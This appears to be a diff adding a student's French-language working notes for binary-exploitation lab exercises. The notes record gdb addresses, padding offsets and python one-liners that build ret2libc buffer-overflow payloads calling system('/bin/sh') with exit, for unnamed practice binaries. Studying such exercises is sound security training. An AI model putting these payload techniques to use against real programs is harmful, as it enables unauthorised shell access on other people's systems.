@@ -1,0 +1,107 @@
+0x080491b0 valide
+0x08049202 printf
+AAAAAAAAAAAAAAAA01234567[4,3,2,1]
+0x804a00c valide string
+(-> dans $ecx avant strcmp)
+
+python -c "print 'A'*24 + '\xb0\x91\x04\x08' + 'BEEF' + '\x0c\xa0\x04\x08',"
+
+3)
+
+Padding de 40
+0x080491d7
+
+0xf7e149e0 System address
+
+36 padding | EBP | PC(EIP) | SHELL*
+
+pour trouver eip (l'adresse de system)
+0xf7e149e0 <system>
+
+pour trouver ebp
+print $ebp + 8
+
+pour trouver SHELL:
+x/500s $esp
+On avance jusqu'au vraiable d'environement
+0xffffdecb:	"SHELL=/bin/bash"
+On ajoute 6
+0xffffded1:	"/bin/bash"
+
+
+`python -c "print 'A'*36 + '\xe0\xd2\xff\xff' + '\xe0\x49\xe1\xf7' + '\x6f\xd5\xff\xff',"`
+
+
+0xf7e07a60 exit
+
+
+40 A | &system | &exit | &"bin/sh"
+
+'40'*a | f7 e1 49 e0 | f7 e0 7a 60 | ff ff d5 75
+
+
+`python -c "print 'A'*40 + '\xe0\x49\xe1\xf7' + '\x60\x7a\xe0\xf7' + '\xd1\xde\xff\xff',"`
+
+find &system,+9999999,"/bin/sh"
+0xf7f54aaa
+warning: Unable to access 16000 bytes of target memory at 0xf7fb26b2, halting search.
+1 pattern found.
+
+
+x/s 0xf7f54aaa
+0xf7f54aaa:	"/bin/sh"
+
+
+40 A | &system | &exit | &"bin/sh"(dans la libc)
+
+'40'*a | f7 e1 49 e0 | f7 e0 7a 60 | f7 f5 4a aa
+
+
+`python -c "print 'A'*40 + '\xe0\x49\xe1\xf7' + '\x60\x7a\xe0\xf7' + '\xaa\x4a\xf5\xf7',"`
+
+
+
+4)
+
+140 A de padding
+
+
+`python -c "print 'A'*140 + '0123'"`
+
+
+system > 0xf7e149e0
+
+exit > 0xf7e07a60
+
+"/bin/sh" >  0xf7f54aaa
+
+
+`python -c "print 'A'*140 + '\xe0\x49\xe1\xf7' + '\x60\x7a\xe0\xf7' + '\xaa\x4a\xf5\xf7',"`
+
+
+exit off = 0
+
+syst off = 53120
+
+"sh" off = 1364042
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
